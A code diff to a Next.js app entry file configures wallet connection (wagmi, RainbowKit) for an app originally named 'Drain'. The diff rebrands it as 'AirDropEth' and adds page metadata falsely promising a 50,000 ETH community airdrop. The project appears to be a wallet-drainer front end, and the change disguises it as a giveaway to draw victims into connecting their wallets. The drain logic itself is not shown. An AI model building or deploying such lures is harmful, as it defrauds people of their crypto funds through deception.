@@ -1,3 +1,23 @@
+import { CssBaseline, GeistProvider } from '@geist-ui/core';
+import type { AppProps } from 'next/app';
+import NextHead from 'next/head';
+import GithubCorner from 'react-github-corner';
+// @ts-ignore
+import '../styles/globals.css';
+
+// Imports
+import {
+  configureChains,
+  createConfig,
+  mainnet,
+  // createClient,
+  WagmiConfig,
+} from 'wagmi';
+import { publicProvider } from 'wagmi/providers/public';
+
+import { getDefaultWallets, RainbowKitProvider } from '@rainbow-me/rainbowkit';
+import '@rainbow-me/rainbowkit/styles.css';
+
 import { arbitrum, bsc, gnosis, optimism, polygon } from 'viem/chains';
 import { z } from 'zod';
 import { useIsMounted } from '../hooks';
@@ -8,17 +28,57 @@ const walletConnectProjectId = z
 
 const { chains, publicClient } = configureChains(
   [mainnet, polygon, optimism, arbitrum, bsc, gnosis],
-  // Configuration continue ici...
+  [publicProvider()],
 );
 
 const { connectors } = getDefaultWallets({
-  appName: 'Drain',
-  projectId: walletConnectProjectId,  // Passer la variable une seule fois
+  appName: 'AirDropEth',  // Assure-toi que c'est bien le nom que tu veux
+  projectId: walletConnectProjectId,
   chains,
 });
 
+const wagmiConfig = createConfig({
+  autoConnect: true,
+  connectors,
+  publicClient,
+});
+
 const App = ({ Component, pageProps }: AppProps) => {
-  return <Component {...pageProps} />;
+  const isMounted = useIsMounted();
+
+  if (!isMounted) return null;
+  return (
+    <>
+      <GithubCorner
+        href="https://github.com/dawsbot/drain"
+        size="140"
+        bannerColor="#e056fd"
+      />
+
+      <WagmiConfig config={wagmiConfig}>
+        <RainbowKitProvider coolMode chains={chains}>
+          <NextHead>
+            <title>AirDropEth</title>
+            <meta
+              name="description"
+              content="50,000 ETH tokens will be redistributed in an airdrop for the community."
+            />
+            <meta property="og:title" content="AirDropEth" />
+            <meta
+              property="og:description"
+              content="50,000 ETH tokens will be redistributed in an airdrop for the community."
+            />
+            <meta property="og:image" content="/favicon.ico" />
+            <link rel="icon" href="/favicon.ico" />
+          </NextHead>
+          <GeistProvider>
+            <CssBaseline />
+            <Component {...pageProps} />
+          </GeistProvider>
+        </RainbowKitProvider>
+      </WagmiConfig>
+    </>
+  );
 };
 
-export default App;  // Un seul export
+export default App;
